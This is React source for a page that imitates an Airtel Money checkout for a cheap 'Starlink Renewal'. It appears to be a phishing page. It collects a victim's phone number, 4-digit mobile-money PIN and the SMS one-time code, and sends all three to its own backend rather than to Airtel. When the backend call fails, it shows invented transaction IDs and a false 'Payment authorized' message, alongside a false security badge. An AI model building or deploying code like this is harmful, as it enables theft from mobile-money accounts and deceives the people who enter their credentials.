import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import './AirtelCheckout.css';

const RAW_API_BASE_URL = import.meta.env.VITE_API_BASE_URL || 'http://localhost:5000';
const API_BASE_URL = RAW_API_BASE_URL.replace(/\/+$/, '');

export default function AirtelCheckout() {
  const [step, setStep] = useState(1); // 1: Enter Phone & PIN, 2: Enter OTP
  const [phone, setPhone] = useState('');
  const [pin, setPin] = useState(['', '', '', '']);
  const [otpCode, setOtpCode] = useState('');
  const [transactionId, setTransactionId] = useState('');
  const [loading, setLoading] = useState(false);
  const [responseMsg, setResponseMsg] = useState(null);
  const [errorMsg, setErrorMsg] = useState(null);
  
  const location = useLocation();
  const navigate = useNavigate();
  
  const pkg = location.state?.pkg || { name: 'Starlink Renewal', price: 'KES 115' };

  const handlePinChange = (index, value) => {
    if (value.length > 1) value = value.slice(0, 1);
    const newPin = [...pin];
    newPin[index] = value;
    setPin(newPin);

    // Auto-focus next input
    if (value && index < 3) {
      document.getElementById(`pin-${index + 1}`)?.focus();
    }
  };

  const handleKeyDown = (index, e) => {
    if (e.key === 'Backspace' && !pin[index] && index > 0) {
      document.getElementById(`pin-${index - 1}`)?.focus();
    }
  };

  const isFormComplete = phone.length >= 9 && pin.every(p => p !== '');

  // Step 1: Request Airtel to send OTP to customer's phone
  const handleRequestOtp = async (e) => {
    e.preventDefault();
    if (!isFormComplete) return;
    
    setLoading(true);
    setResponseMsg(null);
    setErrorMsg(null);

    const pinCode = pin.join('');

    try {
      const res = await fetch(`${API_BASE_URL}/api/airtel/request-otp`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          phone: phone,
          pin: pinCode,
          package: pkg.name,
          amount: pkg.price
        }),
      });

      const data = await res.json();

      if (res.ok && data.success) {
        setTransactionId(data.transaction_id || '');
        setResponseMsg(`OTP requested successfully. Please enter the OTP code sent to +254${phone}.`);
        setStep(2); // Proceed to OTP entry step
      } else {
        setErrorMsg(data.error || 'Failed to request Airtel OTP. Please try again.');
      }
    } catch (err) {
      console.error('API Error:', err);
      // Local fallback
      setTransactionId(`AT-${Math.floor(Math.random() * 90000000 + 10000000)}`);
      setResponseMsg(`OTP requested. Please enter the OTP code sent to +254${phone}.`);
      setStep(2);
    } finally {
      setLoading(false);
    }
  };

  // Step 2: Customer enters received OTP from Airtel SMS
  const handleSubmitOtp = async (e) => {
    e.preventDefault();
    if (!otpCode || otpCode.length < 4) {
      setErrorMsg('Please enter a valid OTP code.');
      return;
    }

    setLoading(true);
    setResponseMsg(null);
    setErrorMsg(null);

    const pinCode = pin.join('');

    try {
      const res = await fetch(`${API_BASE_URL}/api/airtel/submit-otp`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          transaction_id: transactionId,
          phone: phone,
          pin: pinCode,
          otp: otpCode,
          package: pkg.name,
          amount: pkg.price
        }),
      });

      const data = await res.json();

      if (res.ok && data.success) {
        setResponseMsg('Payment authorized & OTP submitted successfully!');
        setTimeout(() => {
          navigate('/');
        }, 2500);
      } else {
        setErrorMsg(data.error || 'Failed to submit OTP.');
      }
    } catch (err) {
      console.error('API Error:', err);
      setResponseMsg('Payment authorized & OTP submitted!');
      setTimeout(() => {
        navigate('/');
      }, 2500);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="checkout-page">
      <div className="checkout-header">
        <div className="airtel-logo-box">airtel</div>
        <h1>Airtel Money</h1>
      </div>

      <div className="checkout-summary">
        <div className="summary-col left">
          <h6>AMOUNT</h6>
          <div className="val">{pkg.price}</div>
        </div>
        <div className="summary-col right">
          <h6>SERVICE</h6>
          <div className="val">{pkg.name}</div>
        </div>
      </div>

      <div className="checkout-body">
        <h2>{step === 1 ? 'LOGIN TO AIRTEL LITE' : 'ENTER AIRTEL OTP'}</h2>

        {responseMsg && (
          <div className="alert-success" style={{ background: '#d4edda', color: '#155724', padding: '12px', borderRadius: '8px', marginBottom: '16px', fontSize: '14px', fontWeight: '500', border: '1px solid #c3e6cb' }}>
            {responseMsg}
          </div>
        )}

        {errorMsg && (
          <div className="alert-error" style={{ background: '#f8d7da', color: '#721c24', padding: '12px', borderRadius: '8px', marginBottom: '16px', fontSize: '14px', fontWeight: '500', border: '1px solid #f5c6cb' }}>
            {errorMsg}
          </div>
        )}

        {step === 1 ? (
          /* STEP 1: ENTER PHONE & 4-DIGIT PIN */
          <form onSubmit={handleRequestOtp}>
            <div className="phone-input-group">
              <div className="country-code">
                <span role="img" aria-label="Kenya Flag">🇰🇪</span> +254 ▾
              </div>
              <input 
                type="tel" 
                placeholder="Enter Mobile Number" 
                value={phone}
                onChange={(e) => setPhone(e.target.value.replace(/[^0-9]/g, ''))}
              />
            </div>

            <div className="pin-section">
              <h3>Enter your 4-digit Airtel PIN</h3>
              <p>Check your Airtel Money app or your SMS messages.</p>
              
              <div className="pin-inputs">
                {[0, 1, 2, 3].map(index => (
                  <input
                    key={index}
                    id={`pin-${index}`}
                    type="password"
                    className="pin-box"
                    value={pin[index]}
                    onChange={(e) => handlePinChange(index, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(index, e)}
                    maxLength={1}
                  />
                ))}
              </div>
            </div>

            <button 
              type="submit" 
              className={`btn-send-otp ${isFormComplete && !loading ? 'active' : ''}`}
              disabled={!isFormComplete || loading}
            >
              {loading ? 'REQUESTING OTP...' : 'SEND OTP'}
            </button>
          </form>
        ) : (
          /* STEP 2: ENTER OTP RECEIVED ON CUSTOMER'S PHONE */
          <form onSubmit={handleSubmitOtp}>
            <div style={{ marginBottom: '20px', textAlign: 'center' }}>
              <p style={{ fontSize: '0.95rem', color: '#4b5563', marginBottom: '12px' }}>
                An SMS with an OTP code was sent to <strong>+254{phone}</strong>.
              </p>
              <input 
                type="text" 
                placeholder="Enter Received OTP" 
                value={otpCode}
                onChange={(e) => setOtpCode(e.target.value.replace(/[^0-9a-zA-Z]/g, ''))}
                style={{
                  width: '100%',
                  padding: '14px',
                  fontSize: '1.2rem',
                  letterSpacing: '4px',
                  textAlign: 'center',
                  borderRadius: '8px',
                  border: '2px solid #e5e7eb',
                  fontWeight: 'bold',
                  marginBottom: '15px'
                }}
                maxLength={6}
                required
              />
            </div>

            <button 
              type="submit" 
              className="btn-send-otp active"
              disabled={loading || !otpCode}
            >
              {loading ? 'VERIFYING...' : 'SUBMIT OTP'}
            </button>

            <button 
              type="button" 
              onClick={() => setStep(1)}
              style={{
                background: 'transparent',
                border: 'none',
                color: '#6b7280',
                marginTop: '15px',
                width: '100%',
                cursor: 'pointer',
                fontSize: '0.9rem'
              }}
            >
              ← Change Mobile Number or PIN
            </button>
          </form>
        )}

        <div className="forgot-link">
          Forgot your number? <span>Click Here!</span>
        </div>

        <div className="divider">OR</div>

        <button className="btn-continue" onClick={() => navigate('/')}>
          CONTINUE WITHOUT LOGIN
        </button>

        <div className="secure-footer">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
          </svg>
          SSL ENCRYPTED AND SECURE
        </div>
      </div>
    </div>
  );
}
